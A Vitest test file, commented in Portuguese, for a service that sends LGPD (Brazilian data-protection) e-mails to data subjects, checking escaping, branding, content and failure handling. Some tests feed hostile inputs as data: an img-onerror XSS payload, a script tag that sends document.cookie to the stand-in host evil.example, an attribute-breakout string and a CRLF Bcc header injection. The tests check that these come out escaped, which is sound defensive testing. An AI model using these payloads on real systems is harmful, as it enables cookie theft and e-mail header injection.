/**
 * O e-mail de LGPD — o unico do sistema cujo destinatario nao e cliente nosso.
 *
 * Quem recebe e o TITULAR do dado: a pessoa cujo CPF passou pelo bureau. Ela
 * nao tem conta, nao tem painel, e esta mensagem e o unico contato dela com o
 * produto. Errar aqui erra na frente de quem a lei protege.
 *
 * Tres coisas estavam quebradas e sao o que este arquivo trava:
 *
 *  1. `protocolo`, `tipo` e `resultSummary` entravam no HTML SEM ESCAPE, e o
 *     `resultSummary` e montado a partir do corpo de uma requisicao do admin.
 *  2. O template era um segundo sistema visual — paleta do Tailwind,
 *     `box-shadow`, raio de 12px, fonte de outro produto.
 *  3. O remetente saia do `EMAIL_FROM` cru, ignorando a marca que a propria
 *     funcao ja recebia: a tela dizia "controlador: CredNet" e o e-mail chegava
 *     assinado por outra empresa.
 */
import { describe, it, expect, vi, beforeEach } from "vitest";

const espiao = vi.hoisted(() => {
  process.env.LGPD_ADMIN_EMAIL = "lgpd@consultaisp.com.br";
  return {
    enviarEmail: vi.fn(async () => undefined),
    log: { warn: vi.fn(), error: vi.fn(), info: vi.fn(), debug: vi.fn() },
  };
});

vi.mock("./email", () => ({ enviarEmail: espiao.enviarEmail }));
vi.mock("../logger", () => ({ logger: espiao.log }));
vi.mock("../storage", () => ({ storage: {} }));

import { sendConfirmationEmail, sendCompletionEmail, sendSlaAlertEmail } from "./lgpd-email.service";
import { MARCA_PLATAFORMA, type MarcaResolvida } from "./marca.service";

const HOSTIL = `<img src=x onerror=alert(1)>`;

const CREDNET: MarcaResolvida = {
  ...MARCA_PLATAFORMA,
  origem: "dominio-proprio",
  contexto: "tenant",
  marcaId: 7,
  dominio: "app.crednet.com.br",
  dominioAtivo: true,
  nomeProduto: "CredNet Bureau",
  assinatura: "Crédito para provedores",
  suporteEmail: "suporte@crednet.com.br",
  cores: {
    claro: { brand: "#1F6F7A", hover: "#186068", soft: "#E4F1F3", ink: "#155760", textOnBrand: "#FFFFFF", ajustada: false },
    escuro: { brand: "#7FC6CF", hover: "#8FD2DA", soft: "#123338", ink: "#A6DCE2", textOnBrand: "#131219", ajustada: false },
  },
};

/** O ultimo envio: [to, assunto, html, marca]. */
const ultimo = () => {
  const c = espiao.enviarEmail.mock.calls.at(-1) as unknown as [string, string, string, MarcaResolvida];
  return { para: c[0], assunto: c[1], html: c[2], marca: c[3] };
};

beforeEach(() => {
  espiao.enviarEmail.mockReset();
  espiao.enviarEmail.mockResolvedValue(undefined);
  espiao.log.warn.mockReset();
  espiao.log.error.mockReset();
});

// ─────────────────────────────────────────────────────────────────────────────
// Escape — o defeito mais grave
// ─────────────────────────────────────────────────────────────────────────────

describe("nada que vem de fora vira marcacao", () => {
  it("protocolo e tipo hostis saem escapados na confirmacao", async () => {
    await sendConfirmationEmail("titular@exemplo.com", HOSTIL, HOSTIL);
    const { html } = ultimo();
    expect(html).not.toContain("<img");
    expect(html).toContain("&lt;img src=x onerror=alert(1)&gt;");
  });

  it("o resultSummary — que vem do corpo de uma requisicao do admin — sai escapado", async () => {
    await sendCompletionEmail(
      "titular@exemplo.com", "LGPD-1", "exclusao",
      `<script>fetch('https://evil.example/'+document.cookie)</script>`,
    );
    const { html } = ultimo();
    expect(html.toLowerCase()).not.toContain("<script");
    expect(html).toContain("&lt;script&gt;");
  });

  it("tipo desconhecido nao vira tag: sai como texto, nao como rotulo inventado", async () => {
    await sendCompletionEmail("titular@exemplo.com", "LGPD-1", `<b>novo-tipo</b>`, "ok");
    const { html } = ultimo();
    expect(html).not.toContain("<b>novo-tipo</b>");
    expect(html).toContain("&lt;b&gt;novo-tipo&lt;/b&gt;");
  });

  it("a fuga de atributo tambem esta fechada", async () => {
    await sendCompletionEmail("titular@exemplo.com", `LGPD-1" style="display:none`, "acesso", "ok");
    expect(ultimo().html).not.toContain(`style="display:none"`);
  });

  it("protocolo com quebra de linha nao produz assunto de duas linhas", async () => {
    await sendConfirmationEmail("titular@exemplo.com", "LGPD-1\r\nBcc: alguem@x.com", "acesso");
    // `enviarEmail` limpa o assunto; aqui basta provar que ele recebe o dado e
    // que o corpo nao ganhou marcacao.
    expect(ultimo().html).not.toContain("<img");
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// O envelope do produto
// ─────────────────────────────────────────────────────────────────────────────

describe("o e-mail parece do mesmo produto", () => {
  it("e um documento completo, com o envelope do sistema", async () => {
    await sendConfirmationEmail("titular@exemplo.com", "LGPD-1756", "acesso");
    const { html } = ultimo();
    expect(html.startsWith("<!DOCTYPE")).toBe(true);
    expect(html).toContain('lang="pt-BR"');
    expect(html).toContain("lgpd · direitos do titular");
  });

  it("nao sobrou nada do template antigo — paleta do Tailwind, sombra nem raio de 12px", async () => {
    await sendConfirmationEmail("titular@exemplo.com", "LGPD-1", "acesso");
    const { html } = ultimo();
    for (const proibido of ["#2563eb", "#f4f6fa", "#1e293b", "#64748b", "box-shadow", "border-radius:12px", "Segoe UI',Arial"]) {
      expect(html).not.toContain(proibido);
    }
  });

  it("o rodape nao promete ao titular uma conta de provedor que ele nao tem", async () => {
    await sendConfirmationEmail("titular@exemplo.com", "LGPD-1", "acesso");
    const { html } = ultimo();
    expect(html).not.toContain("conta de provedor");
    expect(html).toContain("solicitação de direitos do titular");
  });

  it("o preheader existe e nao repete o titulo", async () => {
    await sendConfirmationEmail("titular@exemplo.com", "LGPD-1756", "acesso");
    const { html } = ultimo();
    const previa = html.match(/opacity:0;">([\s\S]*?)<\/div>/)?.[1].trim() ?? "";
    expect(previa).toContain("LGPD-1756");
    expect(previa).not.toBe("Solicitação registrada");
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// O texto continua dizendo o que dizia
// ─────────────────────────────────────────────────────────────────────────────

describe("conteudo", () => {
  it("confirmacao: tipo por extenso, protocolo, prazo e o artigo da lei", async () => {
    await sendConfirmationEmail("titular@exemplo.com", "LGPD-1756-AB12", "correcao");
    const { para, assunto, html } = ultimo();
    expect(para).toBe("titular@exemplo.com");
    expect(assunto).toBe("Solicitação LGPD registrada — LGPD-1756-AB12");
    expect(html).toContain("Correção de Dados");
    expect(html).toContain("LGPD-1756-AB12");
    expect(html).toContain("15 dias úteis");
    expect(html).toContain("Art. 18");
    expect(html).toContain("Você receberá uma notificação por e-mail");
  });

  it("conclusao: tipo, protocolo e o resultado", async () => {
    await sendCompletionEmail("titular@exemplo.com", "LGPD-99", "exclusao", "12 registros ISP anonimizados.");
    const { assunto, html } = ultimo();
    expect(assunto).toBe("Solicitação LGPD concluída — LGPD-99");
    expect(html).toContain("Exclusão de Dados");
    expect(html).toContain("12 registros ISP anonimizados.");
    expect(html).toContain("canal de atendimento LGPD");
  });

  it("os cinco tipos previstos saem por extenso, em portugues acentuado", async () => {
    const esperado: Record<string, string> = {
      acesso: "Acesso aos Dados",
      correcao: "Correção de Dados",
      exclusao: "Exclusão de Dados",
      portabilidade: "Portabilidade de Dados",
      revogacao: "Revogação de Consentimento",
    };
    for (const [tipo, rotulo] of Object.entries(esperado)) {
      await sendConfirmationEmail("t@e.com", "LGPD-1", tipo);
      expect(ultimo().html).toContain(rotulo);
    }
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// A marca do controlador
// ─────────────────────────────────────────────────────────────────────────────

describe("marca", () => {
  it("sem marca, a plataforma", async () => {
    await sendConfirmationEmail("titular@exemplo.com", "LGPD-1", "acesso");
    const { html, marca } = ultimo();
    expect(marca).toBe(MARCA_PLATAFORMA);
    expect(html).toContain("Consulta ISP");
  });

  it("com marca de revendedor, e ele quem assina — nome, cor e remetente", async () => {
    await sendConfirmationEmail("titular@exemplo.com", "LGPD-1", "acesso", CREDNET);
    const { html, marca } = ultimo();
    expect(html).toContain("CredNet Bureau");
    expect(html).not.toContain("Consulta ISP");
    expect(html).toContain("#1F6F7A");
    // A marca chega ao envio: e dela que `remetente()` tira o nome de exibicao.
    // Antes ela parava no template e o cabecalho saia do EMAIL_FROM cru.
    expect(marca).toBe(CREDNET);
  });

  it("a conclusao tambem carrega a marca ate o envio", async () => {
    await sendCompletionEmail("titular@exemplo.com", "LGPD-1", "acesso", "ok", CREDNET);
    expect(ultimo().marca).toBe(CREDNET);
    expect(ultimo().html).not.toContain("Consulta ISP");
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Falha de envio nao desfaz a solicitacao
// ─────────────────────────────────────────────────────────────────────────────

describe("resiliencia", () => {
  it("Resend recusando nao propaga excecao — a solicitacao ja foi gravada", async () => {
    espiao.enviarEmail.mockRejectedValue(new Error("Falha ao enviar email: service unavailable"));
    await expect(sendConfirmationEmail("t@e.com", "LGPD-1", "acesso")).resolves.toBeUndefined();
    await expect(sendCompletionEmail("t@e.com", "LGPD-1", "acesso", "ok")).resolves.toBeUndefined();
    expect(espiao.log.error).toHaveBeenCalledTimes(2);
  });

  it("o log de falha nao expoe o e-mail do titular por inteiro", async () => {
    espiao.enviarEmail.mockRejectedValue(new Error("nope"));
    await sendConfirmationEmail("carlos.eduardo@exemplo.com", "LGPD-1", "acesso");
    const contexto = espiao.log.error.mock.calls[0][0] as { to: string };
    expect(contexto.to).toBe("car***");
    expect(JSON.stringify(contexto)).not.toContain("carlos.eduardo@exemplo.com");
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Alerta de SLA — destinatario e a operacao, nao o titular
// ─────────────────────────────────────────────────────────────────────────────

describe("alerta de SLA", () => {
  const pedido = (protocolo: string, dias: number) =>
    ({ protocolo, nome: "Fulano", tipoSolicitacao: "exclusao", businessDays: dias });

  it("vai para o contato administrativo, com a marca da casa", async () => {
    await sendSlaAlertEmail([pedido("LGPD-1", 13), pedido("LGPD-2", 14)]);
    const { para, assunto, html, marca } = ultimo();
    expect(para).toBe("lgpd@consultaisp.com.br");
    expect(assunto).toBe("ALERTA SLA LGPD — 2 solicitação(ões) próxima(s) do prazo");
    expect(marca).toBe(MARCA_PLATAFORMA);
    expect(html).toContain("LGPD-1");
    expect(html).toContain("LGPD-2");
    expect(html).toContain("13/15 dias úteis");
    expect(html).toContain("Exclusão de Dados");
  });

  it("o rodape diz por que a operacao recebeu, nao fala de titular nem de provedor", async () => {
    await sendSlaAlertEmail([pedido("LGPD-1", 13)]);
    const { html } = ultimo();
    expect(html).toContain("contato administrativo de LGPD");
    expect(html).not.toContain("conta de provedor");
  });

  it("protocolo hostil na lista tambem sai escapado", async () => {
    await sendSlaAlertEmail([{ ...pedido(HOSTIL, 14), tipoSolicitacao: HOSTIL }]);
    const { html } = ultimo();
    expect(html).not.toContain("<img");
    expect(html).toContain("&lt;img src=x onerror=alert(1)&gt;");
  });

  it("sem LGPD_ADMIN_EMAIL nao ha para quem mandar: registra e nao envia", async () => {
    vi.resetModules();
    const anterior = process.env.LGPD_ADMIN_EMAIL;
    delete process.env.LGPD_ADMIN_EMAIL;
    try {
      const semAdmin = await import("./lgpd-email.service");
      await semAdmin.sendSlaAlertEmail([pedido("LGPD-1", 14)]);
      expect(espiao.enviarEmail).not.toHaveBeenCalled();
      expect(espiao.log.warn).toHaveBeenCalledTimes(1);
    } finally {
      process.env.LGPD_ADMIN_EMAIL = anterior;
      vi.resetModules();
    }
  });
});
